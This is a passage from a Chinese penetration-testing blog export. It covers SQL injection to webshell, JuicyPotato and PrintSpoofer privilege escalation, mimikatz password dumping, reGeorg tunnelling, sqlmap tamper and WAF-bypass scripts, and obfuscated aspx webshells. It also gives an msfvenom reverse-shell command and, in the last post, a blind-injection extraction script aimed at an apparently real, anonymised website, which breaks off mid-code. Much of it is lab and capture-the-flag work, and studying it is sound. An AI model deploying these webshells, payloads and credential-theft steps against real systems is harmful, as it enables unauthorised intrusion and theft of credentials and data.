<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
<p>访问  m.txt 成功写入</p>
<p><img src="/posts/3796bdc4/m.png"></p>
<p>尝试写入一句话到网站根目录中</p>
<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
<p>访问mm.php发现成功写入，使用蚁剑进行连接</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>进入终端查看当前权限 <code>whoami</code> 发现权限为 test权限</p>
<p><code>ipconfig </code>发现内网ip 为 10.0.1.4</p>
<p><code>netstat -ano</code> 查看开放的端口</p>
<p><code>tasklist</code> 查看运行的进程</p>
<p><code>systeminfo</code>  查看系统信息 补丁号 </p>
<p><img src="/posts/3796bdc4/buding.png"></p>
<p><a href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
<p>去这个网站找一下可以利用的exp</p>
<br>

<h4 id="JuicyPotato提权"><a href="#JuicyPotato提权" class="headerlink" title="JuicyPotato提权"></a>JuicyPotato提权</h4><p>HotPotato提权</p>
<p>上传 JuicyPotato.exe </p>
<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
<p><img src="/posts/3796bdc4/potato.png"></p>
<p>提权为system权限，然后再添加用户</p>
<p><code>net user Mamor A1S2D3! /add</code> </p>
<p> bbb.exe -p “net localgroup administrators Mamor /add”  //将用户添加到管理员组权限</p>
<p><img src="/posts/3796bdc4/netuser1.png"></p>
<p>net user 查看是否创建成功</p>
<p><img src="/posts/3796bdc4/netuser2.png"></p>
<p>成功创建用户</p>
<br>

<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>内网穿透两种方法:<br>1.让目标机器去连接外网主机(需要公网ip)  前提是目标可以访问外网<br>2.在目标机器上设置信号站(放一个web文件带目标服务器，所有的流量都要通过这个文件)</p>
<p>使用reGeorg进行内网穿透 </p>
<p>将 reGeorg中的 tunnel.nosocket.php 传到目标机器 改名为reG.php</p>
<p>再公网访问下 </p>
<p><img src="/posts/3796bdc4/reG1.png"></p>
<p>本机执行 (python2)</p>
<p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
<p><img src="/posts/3796bdc4/reGrun.png"></p>
<p>本机使用Proxifier 设置代理服务器 127.0.0.1 9999 socks5</p>
<p><img src="/posts/3796bdc4/Proxy.png"></p>
<p>设置代理规则 </p>
<p><img src="/posts/3796bdc4/Proxy2.png"></p>
<p>设置完代理后 使用 mstsc 远程连接10.0.1.4 成功登录</p>
<br>

<h4 id="使用-mimikatz-读取密码"><a href="#使用-mimikatz-读取密码" class="headerlink" title="使用 mimikatz 读取密码"></a>使用 mimikatz 读取密码</h4><p>将 mimikatz通过蚁剑上传到服务器 以管理员身份运行（windows2012/2016不能抓）</p>
<p>提权<code> privilege::debug</code></p>
<p><img src="/posts/3796bdc4/mm2.png"></p>
<p>抓取密码 <code>sekurlsa::logonpasswords</code></p>
<p>成功抓取到Administrator密码 woshifengge1.</p>
<p><img src="/posts/3796bdc4/mm3.png"></p>
<br>

<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>探测内网中是否还有其它主机</p>
<p>mstsc 尝试连接10.0.1.8 使用admin 密码成功登录</p>
<p>得到flag</p>
<p><img src="/posts/3796bdc4/flag.png"></p>
]]></content>
      <categories>
        <category>zkaq</category>
      </categories>
      <tags>
        <tag>zkaq</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_tamper</title>
    <url>/posts/f47a5413/</url>
    <content><![CDATA[<h3 id="几个常用的tamper"><a href="#几个常用的tamper" class="headerlink" title="几个常用的tamper"></a>几个常用的tamper</h3><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><pre><code>适用数据库: All

作用: 进行base64编码

使用前: ` tamper(&quot;1&#39; AND SLEEP(5)#&quot;)`

使用后: `&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;`
</code></pre>
<br>

<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><pre><code>适用数据库: All

作用: 把空格替换为  `+`

使用前:  `tamper(&#39;SELECT id FROM users&#39;)`

使用后: `&#39;SELECT+id+FROM+users&#39;`
</code></pre>
<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><pre><code>测试通过数据库： Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用: 把空格替换为` /**/`

使用前: `tamper(&#39;SELECT id FROM users&#39;)`

使用后: `&#39;SELECT/**/id/**/FROM/**/users&#39;`
</code></pre>
<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><pre><code>作用:  把空格换为其他有效字符

使用前:  `tamper(&#39;SELECT id FROM users&#39;)`

使用后:  `&#39;SELECT%0Did%0CFROM%0Ausers&#39;`
</code></pre>
<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><pre><code>适用数据库：MySQL

测试通过数据库：MySQL 5.1

作用：将空格替换为其他空格符号(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)

使用前：`tamper(&#39;SELECT id FROM users&#39;)`

使用后：`&#39;SELECT%A0id%0CFROM%0Dusers&#39;`
</code></pre>
<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><pre><code>适用数据库：All

作用：将空格替换为--，并添加一个随机字符串和换行符

使用前：`tamper(&#39;1 AND 9227=9227&#39;)`

使用后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
</code></pre>
<br>

<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><pre><code>适用数据库:  All

作用: 使用注释符分割 SQL关键字

使用前:  `tamper(&#39;INSERT&#39;)`

使用后:  `I/**/NS/**/ERT`
</code></pre>
<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><pre><code>作用: 将payload随机大小写

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

使用前: `tamper(&#39;SELECT id FROM `user`&#39;)`

使用后:  `&#39;SeLeCt id FrOm `user`&#39;`
</code></pre>
<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><pre><code>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用: 对payload进行url编码

使用前: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

使用后: `&#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;`
</code></pre>
<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><pre><code>适用数据库:  All

作用:  对payload进行二次url编码

使用前: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

使用后: `&#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;`
</code></pre>
<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><pre><code>适用数据库：All

作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格

使用前：`tamper(&quot;1&#39; AND 1=1&quot;)`

使用后：`1%bf%27 AND 1=1--`
</code></pre>
<br>

<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><pre><code>适用数据库：All

作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）

使用前：`tamper(&#39;1 UNION SELECT 2--&#39;)`

使用后：`1 UNIOUNIONN SELESELECTCT 2--`
</code></pre>
<br>

<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><pre><code>适用数据库：All

作用：追加特定的字符串

使用脚本前：`tamper(&#39;1 AND 1=1&#39;)`

使用脚本后：`1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;`
</code></pre>
<br>

<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><pre><code>适用数据库：MySQL

测试通过数据库：MySQL 5.0

作用：过滤空格，使用mysql内联注释的方式进行注入

使用前：`tamper(&#39;1 AND 2&gt;1--&#39;)`

使用后：`1 /*!30874AND 2&gt;1*/--`
</code></pre>
<br>

<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><pre><code>作用： 把等号替换为LIKE

使用前： `tamper(&#39;SELECT * FROM users WHERE id=1&#39;)`

使用后：`&#39;SELECT * FROM users WHERE id LIKE 1&#39;`
</code></pre>
<br>

<br>

<h3 id="sqlmap-tamper编写"><a href="#sqlmap-tamper编写" class="headerlink" title="sqlmap tamper编写"></a>sqlmap tamper编写</h3><p>先看一个最简单的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>共由三部分组成，priority变量定义和dependencies、tamper函数定义。</p>
<p>priority 定义脚本的优先级，可用于多个tamper脚本的情况下</p>
<p>dependencies函数声明脚本的适用范围和不适用范围，可以为空值</p>
<p>tamper函数为主要函数，接受参数为payload 和**kwargs，这个脚本的返回值为替换后的payload，在这里引号被替换成了 <code>\\&#39;</code></p>
<br>

<p>下面这个是利用内联注释和注释混淆绕安全狗的tamper，具体的可以根据情况稍作修改，进行替换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;/*!*/=/*!*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;ORDER&quot;</span>,<span class="string">&quot;/*!ORDER/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;AND&quot;</span>,<span class="string">&quot;/*!AND/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;/*!FROM/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;OR&quot;</span>,<span class="string">&quot;/*!OR/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION&quot;</span>,<span class="string">&quot;/*!UNION/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&quot;/*!SELECT/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;USER()&quot;</span>,<span class="string">&quot;/*!USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;DATABASE()&quot;</span>,<span class="string">&quot;/*!DATABASE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;VERSION()&quot;</span>,<span class="string">&quot;/*!VERSION/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SESSION_USER()&quot;</span>,<span class="string">&quot;/*!SESSION_USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>,<span class="string">&quot;/*!EXTRACTVALUE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UPDATEXML&quot;</span>,<span class="string">&quot;/*!UPDATEXML/*!/*/**/*/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapos-shell使用</title>
    <url>/posts/a92f908a/</url>
    <content><![CDATA[<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>phpstudy + sqlilab 本地测试</p>
<br>

<h3 id="os-shell-条件"><a href="#os-shell-条件" class="headerlink" title="os-shell 条件"></a>os-shell 条件</h3><ol>
<li>网站必须为root权限</li>
<li>知道网站绝对路径</li>
<li>PHP关闭魔术引号(GPC)，php主动转义功能关闭</li>
<li>secure_file_priv= 值为空</li>
</ol>
<br>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="查看数据库权限是否为dba"><a href="#查看数据库权限是否为dba" class="headerlink" title="查看数据库权限是否为dba"></a>查看数据库权限是否为dba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
<p>current user is DBA: True</p>
<p><img src="/posts/a92f908a/id_dba.png"></p>
<br>

<h4 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
<p><code>select @@datadir</code></p>
<p><img src="/posts/a92f908a/dir.png"></p>
<p>select @@datadir: ‘D:\phpstudy_pro\Extensions\MySQL5.7.26\data\‘</p>
<p>可以推测到 网站根目录 <code>D:\phpstudy_pro\WWW</code></p>
<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
<p>填入绝对路径</p>
<p><img src="/posts/a92f908a/os_shell.png"></p>
<p><img src="/posts/a92f908a/shell.png"></p>
<br>

<br>

<h3 id="寻找网站绝对路径的方法"><a href="#寻找网站绝对路径的方法" class="headerlink" title="寻找网站绝对路径的方法:"></a>寻找网站绝对路径的方法:</h3><ul>
<li>通过网站报错查看绝对路径</li>
<li>根据phpinfo 探针查看信息</li>
<li>配合远程代码执行漏洞  如eval() 传入phpinfo()</li>
<li>根据配置文件获取路径 </li>
<li>通过搜索引擎获取 <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
</ul>
]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kali网络不可达</title>
    <url>/posts/5150e44b/</url>
    <content><![CDATA[<p>出现错误 网络不可达 </p>
<p>解决方法 打开网卡配置文件 <code>sudo vim /etc/network/interfaces</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5)，</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;network&#x2F; interfaces.d&#x2F;*</span><br><span class="line"></span><br><span class="line">#The Loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet Loopback</span><br></pre></td></tr></table></figure>

<p>在后面添加两行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<p>保存退出重启即可</p>
<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://developer.huaweicloud.com/hero/thread-69909-1-1.html">https://developer.huaweicloud.com/hero/thread-69909-1-1.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>暗月内网靶机WP</title>
    <url>/posts/ab4fb19a/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>web服务器  </p>
<p>192.168.0.114 （本地使用nat） </p>
<p>10.10.131(Vm18) 开启防火墙 安全狗 和windows自带杀软</p>
<p>OA系统</p>
<p>10.10.1.130（VM18）</p>
<p>10.10.10.166（VM19）开启防火墙 360全家桶</p>
<p>域控dc</p>
<p>10.10.10.165（VM19） 无防护软件</p>
<p><img src="/posts/ab4fb19a/tuopu.png"></p>
<br>

<p>3台机器密码</p>
<p>win2016-web     <code>!@#QWE123</code></p>
<p>win2016-dc        <code>!@#QWE123.</code></p>
<p>win2012 oa        <code>!@#Q123</code></p>
<br>

<p>目的 :获取域控中的flag.txt内容</p>
<br>

<p>先修改host文件 绑定ip和域名 192.168.0.144 <a href="http://www.moonlab.com/">www.moonlab.com</a></p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>nmap扫一下端口</p>
<p><code>sudo nmap -sV -p- 192.168.0.114</code> 开放了21 90 999 3389 5985 6588端口</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sV -p- 192.168.0.114<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-06-16 10:55 CST<br>Nmap scan report for <a href="http://www.moonlab.com/">www.moonlab.com</a> (192.168.0.114)<br>Host is up (0.00040s latency).<br>Not shown: 65529 filtered ports<br>PORT     STATE SERVICE       VERSION<br>21/tcp   open  ftp           Microsoft ftpd<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>999/tcp  open  http          Microsoft IIS httpd 10.0<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>6588/tcp open  http          Microsoft IIS httpd 10.0<br>MAC Address: 00:0C:29:36:38:42 (VMware)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 123.13 seconds</p>
</blockquote>
<p>看下robots.txt</p>
<blockquote>
<p>User-agent: *<br>Disallow: /SiteServer/<br>Disallow: /SiteFiles/<br>Disallow: /UserCenter/</p>
</blockquote>
<p>访问<code>http://www.moonlab.com/siteserver</code>看到一个管理员登陆页面，使用的是siteserver cms</p>
<p>系统版本：3.6.4 .NET 版本：2.0 数据库：SqlServer </p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>去网上查一下有没有相关漏洞。</p>
<p>发现SiteServer cms存在管理员密码找回漏洞，只需要关闭js 然后输入admin 点击下一步即可得到管理员密码</p>
<p><img src="/posts/ab4fb19a/1.png"></p>
<p><img src="/posts/ab4fb19a/2.png"></p>
<p><img src="/posts/ab4fb19a/3.png"></p>
<p>得到密码为 admin5566 成功登录到后台</p>
<h4 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h4><p>考虑直接在站点文件管理处 上传一个aspx的一句话，但是被安全狗拦截了</p>
<p>看到有.aspx的文件 直接进行编辑修改,然后尝试连接一句话，密码为 1  ，成功使用蚁剑连接</p>
<p><img src="/posts/ab4fb19a/ant4.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var SE&#x3D;Request.Form[&quot;1&quot;];</span><br><span class="line">var SMQ&#x3D;&quot;unsa&quot;,FWJVPDC&#x3D;&quot;fe&quot;,PZEGHR&#x3D;SMQ+FWJVPDC;</span><br><span class="line">function AJHB()</span><br><span class="line">&#123;</span><br><span class="line">return SE;</span><br><span class="line">&#125;</span><br><span class="line">function NCBRJ()</span><br><span class="line">&#123;</span><br><span class="line">    eval(AJHB(),PZEGHR);</span><br><span class="line">&#125;</span><br><span class="line">NCBRJ()</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>也可以在模块管理处上传,在网上找了个aspx一句话免杀，密码为M</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;% var p &#x3D; Request.Item[&quot;M&quot;]; var a &#x3D; p.substring(0,1); var b &#x3D; p.substring(1,99999); var c &#x3D; &quot;un&quot; + Char ( 115 ) + Char ( 97 ) + &quot;fe&quot;; eval(a+b,c);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>通过站点文件管理 可以找到一句话上传的路径 为 根目录\SiteFiles\SiteTemplates\1\ </p>
<p><img src="/posts/ab4fb19a/4.png"></p>
<br>

<p>使用蚁剑连接</p>
<p><img src="/posts/ab4fb19a/ant1.png"></p>
<p>whoami 显示为 <code>iis apppool\moonlab</code></p>
<p>systeminfo 查看值打了两个补丁</p>
<p>tasklist /svc 查看系统进程，查看存在什么杀软，可以看到存在安全狗</p>
<p>netstat -ano 查看本机开放端口</p>
<p>net start 查看已经启动的windows服务</p>
<blockquote>
<p>   Safedog Guard Center<br>   Safedog Update Center<br>   SafeDogCloudHelper</p>
</blockquote>
<p><img src="/posts/ab4fb19a/ant3.png"></p>
<br>

<h4 id="利用PrintSpoofer-提权"><a href="#利用PrintSpoofer-提权" class="headerlink" title="利用PrintSpoofer 提权"></a>利用PrintSpoofer 提权</h4><p>将 PrintSpoofer.exe 上传到 windows/Temp 中</p>
<p>PrintSpoofer64.exe -h 查看帮助</p>
<p>![PrintSpoofer1.PNG]</p>
<p>PrintSpoofer64.exe -i -c “whoami”</p>
<p><img src="/posts/ab4fb19a/PrintSpoofer2.png"></p>
<p>成功执行 system权限</p>
<br>

<hr>
<p>后续还未完成…..</p>
<h4 id="msf生成payload"><a href="#msf生成payload" class="headerlink" title="msf生成payload"></a>msf生成payload</h4><br>

<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.128  LPORT=2333 -e x86/shikata_ga_nai  -i 20 -f csharp -o 1.txt</code></p>
]]></content>
      <categories>
        <category>moon</category>
      </categories>
      <tags>
        <tag>moon</tag>
      </tags>
  </entry>
  <entry>
    <title>某网站sql盲注</title>
    <url>/posts/a615296a/</url>
    <content><![CDATA[<p><code>http://www.xxxxxx.com/products.php?id=113</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=114-1</code>  两页面显示相同</p>
<p>尝试闭合</p>
<p><code>http://www.xxxxxx.com/products.php?id=113&#39;</code>  页面显示错误</p>
<p>使用 “ ‘ ) 等闭合外加注释也显示错误</p>
<p>测试发现不需要进行闭合</p>
<br>

<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=1</code> 页面正常</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=2</code> 页面错误</p>
<p>使用order by 测字段数</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 order by 2</code> 发现无回显</p>
<p>推测是盲注</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20sleep(3)</code> 会延时</p>
<p>判断数据库版本</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20left(version(),6)=%275.5.46%27</code> 得到 为mysql 5.5.46</p>
<p>判断当前数据库长度</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())&gt;5</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())=6</code></p>
<p>得到长度为6位</p>
<p>猜解数据库</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))&gt;114</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))=115</code></p>
<p>判断出第一位为 115 对应 s</p>
<p>得到数据库名为 skytex</p>
<p>判断表长度</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5</code></p>
<p>得到第一张表长度为5</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=10</code></p>
<br>

<p>第n张表</p>
<p><code>length((select table_name from information_schema.tables where table_schema=database() limit &#123;n&#125;,1))&gt;&#123;m&#125;</code></p>
<p>跑表内容</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#39;skytex&#39; limit 0,1),1,1))=97</code></p>
<p>第一张表为 atype</p>
<p>第二张表为 atypeainfo</p>
<p>… …</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.xxxxxx.com/products.php/&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment">#大/小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库长度位6</span></span><br><span class="line"><span class="comment"># 第一张表长 5 第二张表长 10 第三张表为 8 第四张表 9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  <span class="comment">#改变这里长度</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;  #数据库为 skytex</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 0,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #第一张表 atype</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 1,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #第二张表 atypeinfo</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #第三张表 feedback</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 3,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>&quot;</span>    <span class="comment">#第四张表 webadmin</span></span><br><span class="line"></span><br><span class="line">        r = 